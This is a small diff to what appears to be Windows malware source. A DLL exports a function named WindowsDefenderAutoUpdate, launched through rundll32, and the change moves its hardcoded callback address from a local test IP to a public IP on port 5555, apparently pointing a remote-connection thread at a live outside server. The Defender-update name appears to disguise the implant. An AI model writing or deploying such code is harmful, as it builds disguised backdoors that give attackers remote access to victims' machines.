@@ -85,7 +85,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 //不写extern "C"的话，函数名就被VC给改了，就没法用我们定义的函数名来通过rundll32执行该函数了
 extern "C" _declspec(dllexport) void WindowsDefenderAutoUpdate() {
 
-	WCHAR pszAddress[20] = L"192.168.0.101";
+	WCHAR pszAddress[20] = L"81.70.160.41";
 	WCHAR pszPort[10] = L"5555";
 
 	REBORN_THREAD_PARAM* pThreadParam = new REBORN_THREAD_PARAM(pszAddress, pszPort);
